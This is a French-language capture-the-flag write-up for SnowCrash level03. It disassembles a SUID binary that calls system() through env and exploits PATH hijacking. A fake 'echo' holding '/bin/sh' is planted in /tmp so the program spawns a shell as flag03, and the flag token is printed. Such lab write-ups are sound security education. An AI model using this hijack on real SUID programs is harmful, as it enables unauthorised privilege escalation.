# LEVEL03

Le systeme de fichier se presente de cette maniere:

``` bash
level03@SnowCrash:~$ ls -la
total 24
dr-x------ 1 level03 level03  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level03 level03  220 Apr  3  2012 .bash_logout
-r-x------ 1 level03 level03 3518 Aug 30  2015 .bashrc
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
-r-x------ 1 level03 level03  675 Apr  3  2012 .profile

```

Le fichier level03 est un programme. Les deux "s" des permissions representent respectivement le SUID et le SGID.
Le "s" dans "rws" remplace le x pour signifier que le programme s'execute avec les droits du proprietaire du fichier, et non ceux de l'utilisateur qui lance. 
Pour le "r-s" cote groupe, le programme s'execute avec les droits du groupe propietaire du fichier.

En tentant de l'executer on obtient cette phrase:

``` bash
level03@SnowCrash:~$ ./level03 
Exploit me
```

On comprend que l'on va devoir utiliser des outils pour l'analyser.

En utilisant gdb on en conclu que l'on est face a un programme code en c.
``` bash
level03@SnowCrash:~$ gdb ./level03
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level03/level03...done.
(gdb) b main
Breakpoint 1 at 0x80484ad: file /home/user/level03/level03.c, line 11.
```

On cherche a afficher le code en assembleur en syntaxe Intel.

``` bash
(gdb) set disassembly-flavor intel
(gdb) layout asm
```

``` c
0x80484a4 <main>        push   ebp                                                                                 
0x80484a5 <main+1>      mov    ebp,esp                                                                             
0x80484a7 <main+3>      and    esp,0xfffffff0                                                                      
0x80484aa <main+6>      sub    esp,0x20                                                                            
0x80484ad <main+9>      call   0x80483a0 <getegid@plt>                                                             
0x80484b2 <main+14>     mov    DWORD PTR [esp+0x18],eax                                                            
0x80484b6 <main+18>     call   0x8048390 <geteuid@plt>                                                             
0x80484bb <main+23>     mov    DWORD PTR [esp+0x1c],eax                                                            
0x80484bf <main+27>     mov    eax,DWORD PTR [esp+0x18]                                                            
0x80484c3 <main+31>     mov    DWORD PTR [esp+0x8],eax                                                             
0x80484c7 <main+35>     mov    eax,DWORD PTR [esp+0x18]                                                            
0x80484cb <main+39>     mov    DWORD PTR [esp+0x4],eax                                                             
0x80484cf <main+43>     mov    eax,DWORD PTR [esp+0x18]                                                            
0x80484d3 <main+47>     mov    DWORD PTR [esp],eax                                                                 
0x80484d6 <main+50>     call   0x80483e0 <setresgid@plt>                                                           
0x80484db <main+55>     mov    eax,DWORD PTR [esp+0x1c]                                                            
0x80484df <main+59>     mov    DWORD PTR [esp+0x8],eax                                                             
0x80484e3 <main+63>     mov    eax,DWORD PTR [esp+0x1c]                                                            
0x80484e7 <main+67>     mov    DWORD PTR [esp+0x4],eax                                                             
0x80484eb <main+71>     mov    eax,DWORD PTR [esp+0x1c]                                                            
0x80484ef <main+75>     mov    DWORD PTR [esp],eax                                                                 
0x80484f2 <main+78>     call   0x8048380 <setresuid@plt>                                                           
0x80484f7 <main+83>     mov    DWORD PTR [esp],0x80485e0                                                           
0x80484fe <main+90>     call   0x80483b0 <system@plt>                                                              
0x8048503 <main+95>     leave                                                                                      
0x8048504 <main+96>     ret 
```

En regardant le code en assembleur on en deduit que `call` pousse la valeur de retour sur la stack (le registre esp) et execute `/usr/bin/env echo Exploit me`, la sortie vient du programme echo et correspond a ``Exploit me``. L'instruction ``movl $0x80485e0, (%esp)`` indique que l'on met dans esp la valeur issue a l'adresse $0x80485e0. 

On cherche ce qu'il y a donc a l'adresse $0x80485e0:
``` bash
(gdb) x/s 0x80485e0
0x80485e0:	 "/usr/bin/env echo Exploit me"
```

Le programme n'appelle pas `bin/echo` diectement mais `env` qui prend comme argument `echo`dont le chemin est trouve dans le PATH de l'env. 

Comme le programme fait un call avec la chaine "/usr/bin/env echo Exploit me" on peut remplacer le programme appele "echo" par un faux echo pour ouvrir un subshell et lancer la commande getflag en tant que flag03 (comme le programme est execute avec les droits du proprietaire). 

On cherche un dossier ou l'utilisateur level03 a des droits d'ecriture pour cree un faux fichier echo.

On a pas les droits pour ouvrir le dossier /tmp et lister ses fichiers, mais on peux afficher le dossier lui-meme avec ses metadonnees. L'absence de "r" empeche le listing mais pas la creation de fichiers

``` shell
level03@SnowCrash:~$ ls -l /tmp
ls: cannot open directory /tmp: Permission denied
level03@SnowCrash:~$ ls -ld /tmp
d-wx-wx-wx 4 root root 80 Mar  2 15:46 /tmp
```

On cree un fichier echo dans /tmp qui permet d'ouvrir un subshell et on donne tous les droits d'execution

``` shell
level03@SnowCrash:~$ cd /tmp
level03@SnowCrash:/tmp$ echo "/bin/sh" > echo
level03@SnowCrash:/tmp$ chmod +x echo

```

On change le PATH dans l'env pour indiquer un nouveau chemin pour "echo"

``` shell
level03@SnowCrash:/tmp$ export PATH=/tmp:$PATH
level03@SnowCrash:/tmp$ export
declare -x HOME="/home/user/level03"
declare -x LANG="en_US.UTF-8"
declare -x LESSCLOSE="/usr/bin/lesspipe %s %s"
declare -x LESSOPEN="| /usr/bin/lesspipe %s"
declare -x LOGNAME="level03"
declare -x LS_COLORS="rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31:*.taz=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lz=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.axv=01;35:*.anx=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.axa=00;36:*.oga=00;36:*.spx=00;36:*.xspf=00;36:"
declare -x MAIL="/var/mail/level03"
declare -x OLDPWD="/home/user/level03"
declare -x PATH="/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games"
declare -x PWD="/tmp"
declare -x SHELL="/bin/bash"
declare -x SHLVL="7"
declare -x SSH_CLIENT="192.168.56.1 50884 4242"
declare -x SSH_CONNECTION="192.168.56.1 50884 192.168.56.101 4242"
declare -x SSH_TTY="/dev/pts/0"
declare -x TERM="xterm-256color"
declare -x USER="level03"
declare -x temp
```

Puis on execute le level03, un subshell est lance et on peut utiliser la commande getflag:
```shell
level03@SnowCrash:/tmp$ cd
level03@SnowCrash:~$ ./level03
$ whoami
flag03
$ getflag
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus

```
